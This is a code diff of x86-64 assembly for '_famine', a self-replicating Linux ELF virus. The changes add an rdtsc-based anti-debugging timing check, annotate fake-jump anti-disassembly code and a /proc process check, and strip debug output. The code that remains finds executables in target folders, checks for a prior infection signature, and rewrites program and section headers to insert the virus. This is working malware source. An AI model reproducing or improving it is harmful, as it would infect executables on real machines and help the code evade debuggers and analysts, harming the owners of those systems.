@@ -2,31 +2,30 @@
 [BITS 64]
 default rel
 
-%ifdef DEBUG
-extern xprintf
-%endif
-
 section .text
     global _famine
 
 _famine:
-    PUSH        ; little obfuscation
+    PUSH
     mov rbp, rsp
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
 
+;small obfuscation
 obfu:
     push rax              ; rsp - 8
     push rcx              ; rsp - 8
     push rdx              ; rsp - 8
     mov rcx, rsp          ; new rsp
-    mov rsp, rbp          ; rsp = RBP(current stack frme at start)
+    mov rsp, rbp          ; rsp = RBP(current stack frame at start)
     pop rbp               ; pop original RBP
     pop rax               ; pop ret addr
-    lea rdx, [rel $ + 84] ; new ret  addr
-    push rdx              ; push new ret addr
-    push rdx              ; align
-    ret
+    lea rdx, [rel $ + 84] ; New ret addr
+    push rdx              ; Why not ?
+    push rdx              ; for stack align
+    ret                   ; jmp to back_at_it
 
+; Lots of fake JMP
+; This code will not be executed it is only to false disassembly
 ahahahaha:
     push rbp
     mov rbp, rsp
@@ -53,13 +52,14 @@ j3:
     jmp [rel $ + 256]
 j4:
     jmp [rel $ + 512]
-
+;Ths will we executed
 back_at_it:
+    ; Restore back the what we use
     pop rdx
     push rax
     push rbp
     mov rbp, rsp
-    mov rsp, rcx
+    mov rsp, rcx        ;  rcx has real rsp
     pop rdx
     pop rcx
     pop rax
@@ -68,12 +68,23 @@ back_at_it:
     jz begin
 
 db 0x89 ; mov
-db 0x84 ; MOD-REG-R/M
-db 0xD9 ; SIB
+db 0x84 ; MOD(2) - REG(3) - R/M(3)
+; waiting for 4 bytes incomplete
+db 0xD9 ; sib following MOD-REG-R/M
+; mov rax, [ rcx + rbx * 8 + displacement ]
 
 begin:
     pop rax
-; ANTI DEBUG
+; ANTI DEBUG 1 start
+; calculate time elapsed since start
+    rdtsc
+	xor ecx, ecx                ; sets ECX to zero
+	add ecx, eax                ; save timestamp to ECX
+    mov dword [rsp + 124], ecx 
+
+; ANTI DEBUG 2
+next:
+; For mysterious reason this doesn't not work with BASH ???????????????????.
     mov rdi, 0
     mov rsi, 0
     mov rdx, 1
@@ -91,7 +102,7 @@ begin:
     movq mm1, rcx
     paddusb mm0, mm1
     movq rcx, mm0
-    emms
+    emms                ; clear mmx
     shl rcx, 0x10
     shr rcx, 0x10
     mov [rsp], rcx
@@ -102,7 +113,7 @@ begin:
     movq mm3, rcx
     paddusb mm2, mm3
     movq rcx, mm2
-    emms
+    emms                ; clear mmx
     shl rcx, 0x10
     shr rcx, 0x10
     mov [rsp + 6], rcx
@@ -117,7 +128,7 @@ anti_process:
 ; open /proc/
     mov rax, 0x2f636f72702f
     mov [rsp], rax
-    mov [rsp + 6], byte 0x0
+    mov [rsp + 6], byte 0x0    ; not needed
     lea rdi, [rsp]
     mov rdx, 0
     mov rax, SYS_OPEN
@@ -149,7 +160,6 @@ anti_process:
 ; [RSP + 40] = BOOLEAN PROCESS FOUND
 ; [RSP + 42] = BUFFER READ
 ; [RSP + 64]
-; filter process
     mov rcx, rax
     mov rdx, [rsp + 32]
     xor r15, r15
@@ -191,7 +201,7 @@ anti_process:
         mov rdx, 30           ; read 1024
         mov rax, SYS_READ
         syscall
-        cmp rax, 5
+        cmp rax, 5            ; atleast 5 bytes
         jl .cleanup_fd
         mov rcx, 5
         lea rdi, [rsp + 42]
@@ -232,12 +242,19 @@ clean_anti_process:
     mov ax, word [rsp + 40]
     cmp ax, 0
     jne clean
-    mov rcx, 128
-    memset [rsp], rcx
-    ; need ro clean stack aswell.
+    rdtsc                       ; get another timestamp
+
+    ;ANTI DEBUG 1 end
+    mov eax, dword [rsp + 124]
+	sub eax, ecx                ; compute elapsed ticks
+	cmp eax, 0xFFF		        ; jump if less than FFF ticks (assumes that program is not running under a debugging tool like gdb...)
+	jl launch
+    jmp clean
 
 launch:
-    mov r14, 1  ; maybe need to put that at the end.
+    mov rcx, 128
+    memset [rsp], rcx
+    mov r14, 1
 target_dir:
     .f1:
         lea rdi, [rel hook.folder_1]
@@ -297,18 +314,6 @@ target_file:
         movsb
         cmp byte [rsi], 0
         jne .append_file
-%ifdef DEBUG
-    lea rdi, [rsp]
-    sub rcx, rcx
-    sub al, al
-    not rcx
-    cld
-    repne scasb
-    not rcx
-    dec rcx
-    mov [rsp + rcx + 1], byte 0x0                           ; Work because we do not use dirent for now.
-    dbgs [rel hook.target], [rsp]
-%endif
 
 validate_target:
     lea rdi, [rsp]                                          ; filename
@@ -325,9 +330,6 @@ validate_target:
     syscall
     cmp rax, 0
     jne next_file
-%ifdef DEBUG
-    dbg [rel hook.fz], [rsp + FILE_SIZE + DIRENT + 48]     ; st_size
-%endif
 
 map_target:
     push r8                                                 ; save dirent size
@@ -350,46 +352,29 @@ elf_header:
         cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
         jne clear
     .machine:
-        cmp word [rsi + Elf64_Ehdr.e_machine], 62
+        cmp word [rsi + Elf64_Ehdr.e_machine], 62           ; x86_64
         je elf_sign
     jmp clear
-%ifdef DEBUG
-    mov rsi, [rbp - 16]
-    movzx rsi, word [rsi + Elf64_Ehdr.e_type] 
-    dbg [rel hook.e_type], rsi
-    dbg [rel hook.v_size], FAMINE_SIZE
-    mov rsi, [rbp - 16]
-%endif
-; JUMP
+
+; check if already infected
 elf_sign:
-    add rsi, FAMINE_SIZE + 0x6c
-    ; lea rsi, [rsi]
+    add rsi, FAMINE_SIZE + 0x6c                             ; offset signature
     lea rdi, [rel hook.SIGN]
     mov rcx, 38
     cld
     repe cmpsb
     je clear
-    mov rsi, [rbp - 16]
 ; rsi = e_hdr
 elf_phdr:
-    mov rdx, rsi
+    mov rdx, [rbp - 16]
     add rdx, [rdx + Elf64_Ehdr.e_phoff]
     ;rdx = phdr
     PAGE_ALIGN FAMINE_SIZE
     add [rdx + phdr64.p_offset], rcx                        ; phdr[0]
     add [rdx + phdr64.p_offset + 0x38], rcx                 ; phdr[1]
-%ifdef DEBUG
-    push rdx
-    dbg [rel hook.number], [rdx + phdr64.p_offset]
-    pop rdx
-    push rdx
-    dbg [rel hook.number], [rdx + phdr64.p_offset + 0x38]
-    pop rdx
-%endif
 
 ;rdx = phdr[0]
 patch_segtext:
-    ; pop rsi                                               ; PAGE_ALIGN_UP(FAMINE_SIZE)
     mov rsi, rcx
     mov rax, [rbp - 16]
     mov rcx, [rax + Elf64_Ehdr.e_entry]
@@ -408,7 +393,7 @@ patch_segtext:
     .compare:
         cmp dword [rdx + phdr64.p_type], PT_LOAD
         jne .keep
-        cmp dword [rdx + phdr64.p_flags], 0x5
+        cmp dword [rdx + phdr64.p_flags], 0x5               ; R | X
         jne .keep
         sub [rdx + phdr64.p_vaddr], rsi
         mov rdi, [rbp - 16]
@@ -429,7 +414,6 @@ patch_hdr:
 
 patch_shdr:
     mov rax, [rbp - 16]                                     ;EHDR
-    xor rcx, rcx                                            ;0 not needed probably
     mov cx, word [rax + Elf64_Ehdr.e_shnum]                 ;n sections
     add rax, [rax + Elf64_Ehdr.e_shoff]                     ;sections[0]
     .loop:
@@ -503,8 +487,8 @@ clear:
     mov rdi, r8
     mov rax, SYS_CLOSE
     syscall                                                 
+
 next_file:
-    ; maybe RBX not valid anymore aswell.
     mov rcx, FILE_SIZE
     memset [rsp], rcx                                       ; FILESIZE memset
     movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
@@ -523,7 +507,7 @@ clean:
     mov rsp, rbp
     POP
 
-_v_stop:                                                   ; End of virus
+_v_stop:                                                   ; End of famine
     mov rax, SYS_EXIT 
     mov rdi, 0
     syscall
